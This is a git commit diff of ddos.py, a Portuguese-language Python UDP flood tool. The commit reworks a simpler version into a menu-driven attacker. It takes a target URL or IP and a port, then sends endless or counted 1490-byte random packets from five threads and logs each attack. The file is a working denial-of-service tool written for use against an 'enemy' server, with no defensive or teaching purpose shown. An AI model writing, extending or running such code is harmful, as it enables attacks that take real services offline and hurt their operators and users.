6a6eb5834d7e6532bac79b7d0600eead2442540c
Tylor swift <roberdoogarcia@gmail.com>
2025-04-19 18:45:38 -0300

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,56 +1,186 @@
-import requests
-import os
+from colorama import Fore, init
+
 import socket
 import random
 from urllib.parse import urlparse
+import threading
+import logging
+import time
 
-print("""
-*************************
-*     :)                *
-* criado por tylor swift*
-*                       *
-*************************
-""")
-print("escreva a URL do seu inimigo (with http:// or https://)")
-url = input()
-parsed_url = urlparse(url)
-gonnacooked = parsed_url.hostname  
-print("qual porta você quer atacar?(geralemete 80 ou 443)")
-whichport = int(input())  
-print("quantas vezes você quer atacar? (recomendado 1000 ou mais)")
-print("se você colocar 0, ele vai atacar indefinidamente")
-amountofnukes = int(input())  
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-os.system("clear" if os.name == "posix" else "cls")
+init(autoreset=True)
 
-nukes = 0
-try:
-    ip = socket.gethostbyname(gonnacooked)  
-except socket.gaierror:
-    print("invalid hostname. Could not resolve IP.")
-    exit()
+logging.basicConfig(
+    filename='ataques.log', 
+    level=logging.INFO, 
+    format='%(asctime)s - %(levelname)s - %(message)s'
+)
 
-target = (ip, whichport)
-print(f"starting attack on {target[0]}:{target[1]}")
-if amountofnukes == 0:
-    print("Atacando indefinidamente...")
+def validar_porta(porta):
+    
+    if porta < 1 or porta > 65535:
+        raise ValueError("Porta inválida. Insira um valor entre 1 e 65535.")
+
+def validar_quantidade(quantidade):
+    
+    if quantidade < 0:
+        raise ValueError("quantidade não pode ser negativa.")
+
+def https():
+    
+    
+    url = input("digite a URL do alvo (com http:// ou https://): ")
+    parsed_url = urlparse(url)
+    hostname = parsed_url.hostname
+    
+    try:
+        porta = int(input("qual porta voce quer atacar? (geralmente 80 ou 443): "))
+        validar_porta(porta)
+        quantidade = int(input("quantas vezes voce quer atacar? (coloque 0 para ataque indefinido): "))
+        validar_quantidade(quantidade)
+    except ValueError as e:
+        print(Fore.RED + f"Erro na entrada: {e}")
+        return None, None, None
+    
+    return hostname, porta, quantidade
+
+def executar_ataque(target, bytes, quantidade):
+   
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    pacotes_enviados = 0
+
+    try:
+        if quantidade == 0:
+        
+            start_time = time.time()
+            print(Fore.YELLOW + "atacando indefinidamente... pressione Ctrl+C para parar")
+            while True:
+                sock.sendto(bytes, target)
+                pacotes_enviados += 1
+                print(Fore.GREEN + f"pacote enviado... total: {pacotes_enviados}")
+        else:
+            
+            for _ in range(quantidade):
+                sock.sendto(bytes, target)
+                pacotes_enviados += 1
+                print(Fore.GREEN + f"pacote enviado... total: {pacotes_enviados}")
+    except KeyboardInterrupt:
+        print(Fore.CYAN + "ataque interrompido pelo usuario")
+    except Exception as e:
+        print(Fore.RED + f"erro durante o ataque: {e}")
+    finally:
+        sock.close()
+        logging.info(f"ataque concluido no alvo {target[0]}:{target[1]} com {pacotes_enviados} pacotes enviados.")
+
+def main(hostname, porta, quantidade):
+    # inicia o ataque
+    if not hostname or not porta:
+        print(Fore.RED + "entrada invalida encerrando...")
+        return
+
+    try:
+        ip = socket.gethostbyname(hostname)
+        target = (ip, porta)
+        print(Fore.YELLOW + f"Iniciando ataque no alvo {target[0]}:{target[1]}")
+        bytes = random._urandom(1490)
+        
+        
+        threads = []
+        num_threads = 5  
+        for _ in range(num_threads):
+            thread = threading.Thread(target=executar_ataque, args=(target, bytes, quantidade))
+            threads.append(thread)
+            thread.start()
+        
+        for thread in threads:
+            thread.join()
+        
+        print(Fore.CYAN + "ataque concluido")
+    except socket.gaierror:
+        print(Fore.RED + "hostname invalido nao foi possivel resolver o IP")
+    except Exception as e:
+        print(Fore.RED + f"ocorreu um erro geral: {e}")
+def ip_attack():
+    
+    try:
+        ip = input("digite o endereço IP do alvo: ")
+
+        socket.inet_aton(ip)  
+
+        porta = int(input("qual porta voce quer atacar? (geralmente 80 ou 443): "))
+
+        validar_porta(porta)
+
+        quantidade = int(input("quantas vezes voce quer atacar? (coloque 0 para ataque indefinido): "))
+        validar_quantidade(quantidade)
+    except socket.error:
+        print(Fore.RED + "Erro: IP inválido.")
+
+        return None, None, None
+    except ValueError as e:
+        print(Fore.RED + f"Erro na entrada: {e}")
+
+        return None, None, None
+    
+    return ip, porta, quantidade
+
+def main_ip(ip, porta, quantidade):
+    
+    if not ip or not porta:
+        print(Fore.RED + "entrada invalida encerrando...")
+        return
+
+    try:
+        target = (ip, porta)
+        print(Fore.YELLOW + f"iniciando ataque no alvo {target[0]}:{target[1]}")
+
+        bytes = random._urandom(1490)
+        
+        threads = []
+        num_threads = 5  
+        for _ in range(num_threads):
+            thread = threading.Thread(target=executar_ataque, args=(target, bytes, quantidade))
+
+            threads.append(thread)
+            thread.start()
+        
+        for thread in threads:
+            thread.join()
+        
+        print(Fore.CYAN + "ataque concluido!")
+    except Exception as e:
+        print(Fore.RED + f"ocorreu um erro geral: {e}")
+
+def painel():
+    
     while True:
-        sock.sendto(bytes, target)
-        nukes += 1
-        print(f"atacado esse servidor... Sent: {nukes} by tylor swift")
-else:
-    for _ in range(amountofnukes):
-        sock.sendto(bytes, target)
-        nukes += 1
-        print(f"atacado esse servidor... Sent: {nukes} by tylor swift")
-while nukes < amountofnukes:
-    sock.sendto(bytes, target)
-    nukes += 1
-    print(f"atacado esse servidor... Sent: {nukes} by tylor swift")
+        try:
+            opcao = int(input(Fore.CYAN + """
+            ██████╗ ██████╗  ██████╗ ███████╗
+            ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
+            ██║  ██║██║  ██║██║   ██║███████╗
+            ██║  ██║██║  ██║██║   ██║╚════██║
+            ██████╔╝██████╔╝╚██████╔╝███████║
+            ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
+            [1] para atacar com HTTPS
+            [2] para atacar com IP 
+            [0] para sair
+            Opção: """))
+            
+            if opcao == 1:
+                hostname, porta, quantidade = https()
+                main(hostname, porta, quantidade)
+            elif opcao == 2:
+                ip, porta, quantidade = ip_attack()
+                main_ip(ip, porta, quantidade)
 
-print("feito")
-print(f"total de ataques: {nukes}")
-input("pressione enter para sair")
+            elif opcao == 0:
+                print(Fore.CYAN + "saindo...")
+                break
+            else:
+                print(Fore.RED + "opção invalida tente novamente")
+        except ValueError:
+            print(Fore.RED + "erro: por favor, insira um numero valido")
 
+
+painel()
